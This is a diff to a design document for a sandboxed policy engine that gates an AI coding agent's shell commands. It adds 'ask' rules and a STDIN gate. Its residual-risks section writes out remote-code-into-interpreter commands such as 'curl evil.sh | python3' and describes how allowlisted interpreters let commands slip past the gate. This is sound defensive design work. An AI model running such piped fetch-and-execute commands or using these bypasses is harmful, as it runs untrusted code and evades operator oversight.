@@ -28,9 +28,9 @@ revisited if either behavior changes.
 | Area                   | Choice                                                                             | Consequence                                                                        |
 | ---------------------- | ---------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------- |
 | Failure model          | Refuse anything not statically verified                                            | Parse, config, trust, and wrapper failures deny                                    |
-| Outcomes               | deny match → `deny`; allow match → `allow`; unmatched → `ask`                      | Common safe operations avoid prompts without silently accepting unknown commands   |
+| Outcomes               | deny match → `deny`; ask match → `ask`; allow match → `allow`; unmatched → `ask`  | Common safe operations avoid prompts without silently accepting unknown commands   |
 | Parser                 | `mvdan.cc/sh/v3/syntax`                                                            | Native Go AST, one dependency, no runtime bridge                                   |
-| Matching               | argv tokens with one linear `ANY` or `HAS` construct; command token matches the resolved executable basename | Bare names and absolute-path spellings hit the same rules without unsafe globbing  |
+| Matching               | argv tokens with one linear `ANY` or `HAS` construct and an optional `STDIN` gate; command token matches the resolved executable basename | Bare names and absolute-path spellings hit the same rules; stdin-fed commands can be restricted independently |
 | Dynamic shell features | Inspect substitutions; reject variables, arithmetic, assignments, and functions    | Unknown runtime values cannot bypass matching                                      |
 | Executable trust       | Search inherited `PATH`, then require a configured trusted directory               | Models the binary Bash would choose while rejecting user-writable shadows          |
 | Canonical paths        | Do not use `realpath`                                                              | Policies refer to stable lookup paths rather than versioned symlink targets        |
@@ -40,7 +40,7 @@ revisited if either behavior changes.
 | Project integrity      | Hash normalized tiers and verify a read-only attestation store                     | Workspace edits fail closed until approved by an operator                          |
 | Installation           | Engine, rules, and attestations below `$HOME/.shizo`, read-only in the sandbox | Writable Claude configuration cannot replace the gate                              |
 | Hook failures          | Exit 2 for denial; wrapper converts malformed outcomes to exit 2                   | Crashes and invalid output do not silently permit execution                        |
-| Automode               | Defer only unmatched results                                                       | Explicit allow and deny policy remains authoritative                               |
+| Automode               | Defer only unmatched results; explicit ask rules emit `ask`                        | Explicit allow, deny, and ask policy remains authoritative                         |
 | Logging                | Require a writable log directory before evaluation                                 | Every attempted hook decision has a log destination, though logs remain tamperable |
 
 Self-protection belongs to the sandbox profile, not to Bash policy.
@@ -75,8 +75,13 @@ that can edit both policy and records makes verification meaningless.
 ## Residual risks
 
 - Allowlisting an interpreter such as `bash`, `python`, or `node` can grant
-  arbitrary execution through its evaluation flags. This is a policy error, not
-  something argv matching can repair.
+  arbitrary execution through its evaluation flags or piped stdin. The `STDIN`
+  marker and `stdin` directive mitigate the stdin vector by gating allowed
+  commands that receive piped or redirected input, but they cannot inspect the
+  content itself. A `deny STDIN python3 ANY` blocks `curl evil.sh | python3`,
+  and `stdin ask` forces human review of any stdin-fed command. Compound stdin
+  sinks (`curl x | { python3; }`) are denied structurally because the
+  receiving command cannot be statically identified.
 - `HAS` blocks only listed flags. Dangerous alternatives remain possible until
   policy authors enumerate them.
 - Matching occurs before glob, brace, and tilde expansion. Runtime-expanded
